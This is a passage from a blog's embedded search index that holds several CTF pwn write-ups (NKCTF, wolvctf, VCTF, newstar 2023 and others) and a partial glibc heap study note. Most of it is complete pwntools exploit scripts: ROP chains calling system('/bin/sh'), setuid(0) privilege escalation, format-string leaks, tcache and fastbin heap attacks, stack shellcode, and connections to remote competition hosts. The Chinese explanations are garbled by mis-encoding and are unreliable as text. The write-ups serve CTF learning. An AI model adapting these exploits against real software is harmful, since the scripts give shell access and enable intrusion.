p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;/bin/sh&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;za1yunti4n&#34;&gt;Za1Yunti4n&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªé¢˜ï¼Œemmmmmï¼Œç”¨C++å†™çš„ï¼Œä»£ç éå¸¸å¤šï¼Œåˆ†æç¨‹åºå‘ç°åªè¦è´­ä¹°åˆ°å°å–éƒ¨å°±å¯ä»¥æ‹¿åˆ°shellï¼Œçœ‹ä¸‰æ¬¡æˆ˜é˜Ÿvipå°±å¯ä»¥æŠŠè‡ªå·±çš„é’±å˜æˆè´Ÿæ•°ï¼Œä¹°åˆ°å°å–éƒ¨ï¼Œä¸ç”¨è„šæœ¬&lt;/p&gt;
">NSSCTF Round#21 Basic</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/nkctf/"" data-c="
          &lt;h1 id=&#34;leek&#34;&gt;leek&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1711364307553.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å…ˆè¯»å–äº†6ä¸ªå­—ç¬¦ï¼Œç„¶åä½¿ç”¨stdoutçš„å®é™…åœ°å€å¯¹æ¯ä¸ªå­—ç¬¦å–ä½™ï¼Œä¿¡å®‰æ•°åŸºåˆšå­¦äº†å­™å­å®šç†(ä¸­å›½å‰©ä½™å®šç†)ï¼Œç½‘ä¸Šç›´æ¥æœ‰ç°æˆçš„pythonè„šæœ¬ï¼Œç„¶åçŒœlibcç‰ˆæœ¬ï¼ˆæ¶å¿ƒè‡³æï¼‰ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºæ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
from LibcSearcher import *
import math
#p = process(&amp;quot;./leak&amp;quot;)
p = remote(&amp;quot;node.nkctf.yuzhian.com.cn&amp;quot;,31660)
elf = ELF(&amp;quot;./leak&amp;quot;)
libc = elf.libc
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

def Get_Mi(m_list, m):
    M_list = []
    for mi in m_list:
        M_list.append(m // mi)
    return M_list


def Get_resMi(M_list, m_list):
    resM_list = []
    for i in range(len(M_list)):
        resM_list.append(Get_ni(M_list[i], m_list[i])[0])
    return resM_list


def Get_ni(a, b):
    if b == 0:
        x = 1
        y = 0
        q = a
        return x, y, q
    ret = Get_ni(b, a % b)
    x = ret[0]
    y = ret[1]
    q = ret[2]
    temp = x
    x = y
    y = temp - a // b * y
    return x, y, q


def result(a_list, m_list):
    for i in range(len(m_list)):
        for j in range(i + 1, len(m_list)):
            if 1 != math.gcd(m_list[i], m_list[j]):
                print(&amp;quot;ä¸èƒ½ç›´æ¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†&amp;quot;)
                return
    m = 1
    for mi in m_list:
        m *= mi
    Mi_list = Get_Mi(m_list, m)
    Mi_inverse = Get_resMi(Mi_list, m_list)
    x = 0
    for i in range(len(a_list)):
        x += Mi_list[i] * Mi_inverse[i] * a_list[i]
        x %= m
    return x


if __name__ == &#39;__main__&#39;:
	#gdb.attach(p)
	payload = b&#39;\x65&#39; + b&#39;\x67&#39; + b&#39;\x6b&#39; + b&#39;\x6d&#39; + b&#39;\x71&#39; + b&#39;\x7f&#39;
	p.sendafter(&amp;quot;secret\n&amp;quot;,payload)
	a_list = [1,2,3,4,5,6]
	for i in range(0,6):
		a_list[i] = ord(p.recv(1))
		
	t = ord(p.recv(1))
	m_list = [0x65,0x67,0x6b,0x6d,0x71,0x7f]
	print(a_list)
	print(t)
	print(&amp;quot;æœ€ç»ˆç»“æœä¸ºï¼š&amp;quot;)
	out = result(a_list, m_list)
	while out%0x1000!=0x780:
		out += 0x195682D1EC3
	print(hex(out))
	base = out - libc.sym[&#39;_IO_2_1_stdout_&#39;]
	print(hex(base))
	sys = base + 0x50D70
	sh = base + 0x1D8678
	t += 11*8
	rdi = base + 0x2a3e5
	ret = base + 0x29139
	payload = p64(ret) + p64(rdi) + p64(sh) + p64(sys) + p8(t)
	#pause()
	p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;maimai&#34;&gt;maimai&lt;/h1&gt;
&lt;p&gt;å‰é¢æœ‰ä¸ªåˆ¤æ–­é€»è¾‘ï¼Œéšä¾¿å¡«äº†å¡«å°±èƒ½è¿‡å»ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²cannaryå’Œlibcåœ°å€ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºæ‹¿åˆ°shellï¼Œä½†æ˜¯æ‹¿åˆ°shellåå‘ç°openè¢«banæ‰äº†ï¼Œæ²¡æœ‰æ‰“å¼€flagçš„æƒé™ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨systemå‡½æ•°å‰è°ƒç”¨setuid(0)å‡½æ•°ææƒï¼ˆå…³äºè¿™ä¸€ç‚¹åœ¨begingameä¸­çš„unhappyé‚£é“é¢˜ä¸­æœ‰æåŠï¼Œä½†æ˜¯å½“æ—¶å¤ç°æ—¶çœ‹äº†çœ¼wpå¾—çŸ¥è¦ç”¨orwï¼Œæ‰€ä»¥ç›´æ¥ç”¨orwæ¥åšäº†ï¼Œæ²¡ç®¡ææƒçš„äº‹ï¼Œä»¥åå†ä¹Ÿä¸çœ‹wpåšé¢˜äº†ğŸ¤¡ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
#context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
#p = process(&#39;./pwn&#39;)
p = remote(&amp;quot;node.nkctf.yuzhian.com.cn&amp;quot;,32996)

#gdb.attach(p)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;1&#39;)
sleep(1)
for i in range(49):
	p.sendline(b&amp;quot;15.0 SSS+&amp;quot;)
	
p.sendlineafter(&amp;quot;rank.\n&amp;quot;,b&amp;quot;15.0 SS&amp;quot;)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;2&#39;)
#pause()
p.sendlineafter(b&amp;quot;nickname.\n&amp;quot;,b&#39;%11$p&#39;)
p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can  =&amp;quot;,hex(can))

p.sendlineafter(b&amp;quot;maimai?\n&amp;quot;,b&#39;aaaaaaaa&#39;)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;2&#39;)
p.sendlineafter(b&amp;quot;nickname.\n&amp;quot;,b&#39;%13$p&#39;)
p.recvuntil(&amp;quot;0x&amp;quot;)
libc = int(p.recv(12),16) + 0x30 - 0x29dc0
print(&amp;quot;libc  =&amp;quot;,hex(libc))

rdi = libc + 0x2a3e5
rdx = libc + 0x11f2e7
rsi = libc + 0x2be51
ret = libc + 0x29139
sh = libc + 0x1D8678
sys = libc + 0x50D70
uid = libc + 0xEC0D0

payload = b&#39;a&#39;*40 + p64(can) + p64(0xdeadbeef) + p64(rdi) + p64(0) + p64(uid) + p64(rdi) + p64(sh)  + p64(sys) 
#pause()
p.sendlineafter(b&amp;quot;maimai?\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pallu&#34;&gt;pallu&lt;/h1&gt;
&lt;p&gt;æ¯”èµ›çš„æ—¶å€™å°±æ²¡çœ‹åˆ°giftè¿™é‡Œæœ«å°¾æ²¡ç½®0ğŸ¤¡ï¼Œå°±çœ‹åˆ°è®¾ç½®æ ‡ç­¾æ—¶å¯èƒ½æœ‰ä¸ªæº¢å‡ºï¼Œå­¦ä¹ wpåå‘ç°æ˜¯é€šè¿‡giftæ³„éœ²libcåŸºåœ°å€å’Œæ ˆåœ°å€ï¼Œé€šè¿‡èµ·åä¹Ÿèƒ½æ³„éœ²å †åœ°å€ï¼Œä¸»è¦æ”»å‡»æ€è·¯å°±æ˜¯æŠŠåœ¨æ ˆä¸Šç”³è¯·å †å—ï¼Œæ§åˆ¶æ‰§è¡Œæµ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./pallu&#39;)

def get(idx):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;index:&amp;quot;, str(idx))

def gift(content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;8&amp;quot;)
	p.sendlineafter(&amp;quot;code:&amp;quot;, content)
    	
def kill(idx):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;5&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx))

def sset(idx, content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx))
	p.sendlineafter(&amp;quot;Labels:&amp;quot;, content)
	
def breed(idx1,idx2,content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;4&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx1))
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx2))
	p.sendlineafter(&amp;quot;(y/n)&amp;quot;, b&#39;y&#39;)
	p.sendafter(&amp;quot;name:&amp;quot;, content)
def exit_():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;10&amp;quot;)


#gdb.attach(p)
gift(b&#39;a&#39;*15)
libc = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x3c38e0
print(&amp;quot;libc = &amp;quot;,hex(libc))
gift(b&#39;a&#39;*71)
stack = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x20
print(&amp;quot;stack = &amp;quot;,hex(stack))

get(1)#0x500
get(2)#0x930
breed(0,1,b&#39;h&#39;*0x10)
p.recvuntil(b&#39;h&#39;*0x10)
p.recvuntil(b&#39;h&#39;*0x10)
heap = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x950
print(&amp;quot;heap = &amp;quot;,hex(heap))
kill(2)
kill(1)
kill(0)
get(3) 
get(3) 
kill(0) 
get(1) 
get(1) 
kill(2) 
sset(0,b&#39;g&#39;*0x500+p64(0)+p64(0x221)+p64(0x7f8796c7ad78-0x7f87968b7000+libc)+p64(stack-0x30))
giftcode=b&#39;Happy NKCTF2024!&#39;
giftcode=giftcode.ljust(0x10,b&#39;\0&#39;)
giftcode+=p64(0)+p64(0)+p64(stack-0x30)+p64(0)
giftcode+=p64(0)+p64(0)+p64(heap)+p64(stack-0x50)

gift(giftcode)
#pause()
print(&amp;quot;send giftcode2&amp;quot;)
gift(b&#39;Welcome PalluWorld!&#39;)

one=libc+0x4525a

sset(3,b&#39;\x00&#39;*4*8+p64(0xdeadbe00)+p64(one)+p64(0)*10)

exit_()

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
">NKCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/vctf-na-xin-sai/"" data-c="
          &lt;h1 id=&#34;ezhp_code&#34;&gt;ezhp_code&lt;/h1&gt;
&lt;h2 id=&#34;addå‡½æ•°&#34;&gt;addå‡½æ•°&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710941694813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¨‹åºæœ‰åé—¨å‡½æ•°ï¼Œå¹¶ä¸”addåŠŸèƒ½ä¸­å­˜åœ¨æ¼æ´&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710941285882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¦‚æœa1+40çš„ä½ç½®æœ‰å€¼ï¼Œåˆ™ç›´æ¥æ‰§è¡Œï¼Œä½†æ˜¯ç¨‹åºåœ¨delåŠŸèƒ½ä¸­å°†è¯¥ä½ç½®ç½®0ï¼Œä½†æ˜¯æœªå¯¹å†…å®¹çš„å †æ¸…é›¶ï¼Œæ‰€ä»¥è®¾æ³•æŠŠå†…å®¹chunkåˆ†é…ç»™æ¼æ´chunkï¼Œä½†æ˜¯æŒ‰tchaceçš„å…ˆè¿›åå‡ºç‰¹æ€§æ— æ³•å®ç°ï¼Œå‘ç°é™åˆ¶8ä¸ªchunkï¼Œæ‰€ä»¥æŠŠtchaceå †å¡«æ»¡å³å¯å®ç°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710941419440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./pwn&#39;)
sys = 0x4012A5

def add(size):
	p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;name:\n&amp;quot;, b&#39;a&#39;*40 + p64(sys))
	p.sendlineafter(&amp;quot;say:\n&amp;quot;, str(size))
	p.sendlineafter(&amp;quot;say:\n&amp;quot;, b&#39;a&#39;*40 + p64(sys))
    	
def dele():
	p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;2&amp;quot;)
	
#gdb.attach(p)
add(71)
add(71)
add(71)
add(71)
dele()
dele()
dele()
dele()
#pause()
p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;1&amp;quot;)

#pause()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">VCTFçº³æ–°èµ›</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/wolvctf/"" data-c="
          &lt;h1 id=&#34;byteoverflow&#34;&gt;byteoverflow&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710677282987.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°æ— æ³•ä¿®æ”¹gotè¡¨é¡¹ï¼Œå¼€å¯äº†æ ˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ ˆä¸Šå¸ƒç½®shellcodeï¼Œå†è®¾æ³•æ‰§è¡Œï¼Œå‘ç°ç¨‹åºå­˜åœ¨å¤šæ¬¡ä¸€å­—èŠ‚æº¢å‡ºï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆåœ°å€ï¼Œå†é€šè¿‡ä¸€å­—èŠ‚æº¢å‡ºæ§åˆ¶rspä»è€Œæ§åˆ¶æ‰§è¡Œæµ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p=process(&amp;quot;./byteoverflow&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

#gdb.attach(p)
p.sendlineafter(&amp;quot;EXIT\n\n&amp;quot;,b&#39;2&#39;)
payload = b&#39;%38$p&#39;
p.sendlineafter(&amp;quot;below: \n\n&amp;quot;,payload)
p.recvuntil(b&#39;0x&#39;)
stack = int(p.recv(12),16)
print(hex(stack))
sc = asm(shellcraft.sh())
p.sendlineafter(&amp;quot;EXIT\n\n&amp;quot;,b&#39;1&#39;)
ret = stack - 0x80
pay = p64(ret + 0x10)*22 + sc 
payload = pay.ljust(0x100,b&#39;a&#39;) + p8(ret&amp;amp;0xff)
#pause()
p.sendlineafter(&amp;quot;Mode\n\n&amp;quot;,payload)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710677509264.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;deepstring&#34;&gt;DeepString&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710685980984.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686002366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ç¨‹åºæŠŠåŠŸèƒ½å‡½æ•°å†™åœ¨äº†æ ˆä¸Šï¼Œæ ¹æ®åç§»è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”å‘ç°è¾“å…¥è´Ÿæ•°åç§»å¯ä»¥é€ æˆæ•°ç»„æº¢å‡ºå®ç°æ§åˆ¶æ‰§è¡Œæµï¼Œç¨‹åºä¸­å­˜åœ¨reflectå‡½æ•°ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„éœ²libcåŸºåœ°å€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686177171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686044642.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p = process(&amp;quot;./DeepString&amp;quot;)
elf = ELF(&amp;quot;./DeepString&amp;quot;)
libc = elf.libc
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

#gdb.attach(p)
reflect = 0x401405
p.sendlineafter(b&amp;quot;reverse\n\n&amp;quot;,b&#39;-37&#39;)
pay = b&#39;%29$paaa&#39; + p64(reflect)
p.sendlineafter(b&amp;quot;STRING: \n&amp;quot;,pay)
p.recvuntil(&amp;quot;0x&amp;quot;)
base = int(p.recv(12),16) - 16 - 0xf80d0
print(hex(base))
sys = base + 0x4C330
p.sendlineafter(b&amp;quot;reverse\n\n&amp;quot;,b&#39;-37&#39;)
pay = b&#39;/bin/sh\x00&#39; + p64(sys)
#pause()
p.sendlineafter(b&amp;quot;STRING: \n&amp;quot;,pay)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">wolvctf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/newstar-2023-week4/"" data-c="
          &lt;h1 id=&#34;ezpwnuaf&#34;&gt;ezpwnï¼ˆUAFï¼‰&lt;/h1&gt;
&lt;p&gt;2.31&lt;/p&gt;
&lt;h2 id=&#34;add&#34;&gt;add&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246482638.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç”³è¯·æ—¶å…ˆç”³è¯·ä¸€ä¸ªå›ºå®šå¤§å°0x20çš„å †æ¥å­˜æ”¾æ¯ä¸€é¡µçš„åœ°å€ï¼Œç„¶åæ¯ä¸€é¡µå­˜æ”¾ç€sizeå’Œå†…å®¹&lt;/p&gt;
&lt;h2 id=&#34;delete&#34;&gt;delete&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246509890.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é‡Šæ”¾é‚£ä¸ª0x20çš„å †&lt;/p&gt;
&lt;h2 id=&#34;show&#34;&gt;show&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246536742.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246557783.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œå¯¹ç¼–è¾‘çš„å¤§å°æœ‰ä¸€ä¸ªæ£€æŸ¥&lt;/p&gt;
&lt;p&gt;ç¨‹åºå­˜åœ¨UAFæ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡freeä¸¤ä¸ªå †ï¼Œå†ç”³è¯·ä¸€ä¸ªï¼Œä»è€Œç”³è¯·åˆ°ç¬¬ä¸€ä¸ªå †çš„æ§åˆ¶é¡µï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œå‘ç°one_gadgetsçš„æ¡ä»¶æ— æ³•æ»¡è¶³ï¼Œæ— æ³•ç›´æ¥æ§åˆ¶å¯„å­˜å™¨ï¼Œä½†æ˜¯å¦‚æœæ¡ä»¶åœ¨æ ˆä¸Šåˆ™å¯ä»¥é€šè¿‡åŒæ—¶ä¿®æ”¹realloc_hookå’Œmalloc_hookå®ç°è°ƒæ ˆï¼Œæ‰€ä»¥é€‰æ‹©æ”¹free_hookï¼Œç”±äºå¼€äº†PIEæ‰€ä»¥éœ€è¦é€šè¿‡ç”³è¯·mmapç”³è¯·çš„å †æ¥æ³„éœ²libcåŸºåœ°å€&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
 
libc = ELF(&#39;./libc-2.31.so&#39;)
 
p = process(&#39;./pwn&#39;)
context(arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
def add(idx, size, msg=b&#39;/bin//sh&#39;):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;1&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
    p.sendlineafter(b&amp;quot;enter size: \n&amp;quot;, str(size).encode())
    p.sendlineafter(b&amp;quot;write the note: \n&amp;quot;, msg)
 
def free(idx):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;2&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
 
def show(idx):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;3&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
 
def edit(idx, msg):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;4&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
    p.sendlineafter(b&amp;quot;enter content: \n&amp;quot;, msg)
#gdb.attach(p)
add(0, 0x21000)
add(1, 0x40)
add(2, 0x40)
add(3, 0x40)

free(0)
free(1)

add(4, 0x20 , b&#39;a&#39;*24)

show(4)
libc_base = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) + 0x21ff0
print(f&amp;quot;{ libc_base = :x}&amp;quot;)
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
print(f&amp;quot;{ free_hook = :x}&amp;quot;)
edit(4,p64(0x21000) + p64(0)*2 + p64(free_hook))
sys = libc_base + libc.sym[&#39;system&#39;]

edit(0,p64(sys))
edit(4, b&#39;/bin//sh&#39;)
#pause()
free(0)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;god_of_changeoff-by-one&#34;&gt;god_of_changeï¼ˆoff-by-oneï¼‰&lt;/h1&gt;
&lt;p&gt;2.31&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710333803521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ç¨‹åºå­˜åœ¨ä¸€ä¸ªå­—èŠ‚æº¢å‡ºï¼Œæ‰“å †è¦†ç›–&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
 
libc = ELF(&#39;./libc-2.31.so&#39;)
 
p = process(&#39;./pwn&#39;)
context(arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
def add(size, msg=b&#39;/bin//sh&#39;):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;1&#39;)
    p.sendlineafter(b&amp;quot;size: &amp;quot;, str(size).encode())
    p.sendafter(b&amp;quot;the content: \n&amp;quot;, msg)
 
def free(idx):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;3&#39;)
    p.sendlineafter(b&amp;quot;idx: &amp;quot;, str(idx).encode())
 
def show(idx):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;2&#39;)
    p.sendlineafter(b&amp;quot;idx: \n&amp;quot;, str(idx).encode())
    p.recvline()

#gdb.attach(p)

add(0x18)
add(0x18)
add(0x38)
for _ in range(9):
	add(0x78)

free(0)
add(0x18,b&#39;\x00&#39;*0x18 + b&#39;\x61&#39;)
free(1)
add(0x58,p64(0)*3 + p64(0x441))
free(2)
add(0x38)
show(3)
libc_base = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 96 - libc.sym[&#39;__malloc_hook&#39;] - 0x10
print(f&amp;quot;{ libc_base = :x}&amp;quot;)
sys = libc_base + libc.sym[&#39;system&#39;]
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
print(f&amp;quot;{ free_hook = :x}&amp;quot;)

add(0x38)
free(3)
free(2)
free(1)
add(0x58, flat(b&#39;/bin/sh\x00&#39;,0,0,0x41, p64(free_hook)))
add(0x38)
add(0x38, p64(sys))
free(1)

p.interactive()
 
&lt;/code&gt;&lt;/pre&gt;
">newstar 2023 week4</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/glibc-dui-li-yong/"" data-c="
          &lt;p&gt;å­¦ä¹ é“¾æ¥ï¼š&lt;a href=&#34;https://blog.csdn.net/qq_41453285/article/details/96865321&#34;&gt;https://blog.csdn.net/qq_41453285/article/details/96865321&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;arena&#34;&gt;arena&lt;/h1&gt;
&lt;p&gt;æ¯ä¸ªåˆ†é…åŒºï¼ˆarenaï¼‰éƒ½æ˜¯ç»“æ„ä½“ malloc_state çš„ä¸€ä¸ªå®ä¾‹ï¼Œptmalloc ä½¿ç”¨ malloc_state æ¥ç®¡ç†åˆ†é…åŒºã€‚åœ¨ pwndbg ä¸­å¯ä»¥ä½¿ç”¨ arena â€‹æŸ¥çœ‹ç»“æ„ä½“å†…å­˜å‚¨çš„æ•°æ®&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709627315286.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;malloc&#34;&gt;malloc&lt;/h1&gt;
&lt;p&gt;æ¯æ¬¡mallocç”³è¯·å¾—åˆ°çš„å†…å­˜æŒ‡é’ˆï¼Œå…¶å®æŒ‡å‘user dataçš„èµ·å§‹å¤„ã€‚è€Œåœ¨é™¤äº†tcacheçš„å„ç±»binçš„é“¾è¡¨ä¸­fdä¸bkç­‰æŒ‡é’ˆå´æŒ‡å‘ç€chunk headerï¼Œtcacheä¸­nextæŒ‡é’ˆæŒ‡å‘user data&lt;/p&gt;
&lt;h2 id=&#34;mmapç”³è¯·é˜ˆå€¼0x20000128kb&#34;&gt;mmapç”³è¯·é˜ˆå€¼ï¼ˆ0x20000ï¼ˆ128kbï¼‰ï¼‰&lt;/h2&gt;
&lt;h1 id=&#34;bin&#34;&gt;bin&lt;/h1&gt;
&lt;h2 id=&#34;tcache-bins24~0x408å•é“¾è¡¨å…ˆè¿›åå‡º&#34;&gt;tcache bins(24~0x408)ï¼ˆå•é“¾è¡¨ï¼Œå…ˆè¿›åå‡ºï¼‰&lt;/h2&gt;
&lt;h2 id=&#34;fast-bin0x20~0x80å•é“¾è¡¨å…ˆè¿›åå‡º&#34;&gt;fast bin(0x20~0x80)ï¼ˆå•é“¾è¡¨ï¼Œå…ˆè¿›åå‡ºï¼‰&lt;/h2&gt;
&lt;p&gt;1.mallopt(1,0)å³mallopt(M_MXFAST,0)å°† MAX_FAST_SIZEè®¾ä¸º0ï¼Œç¦ç”¨fast bin&lt;br&gt;
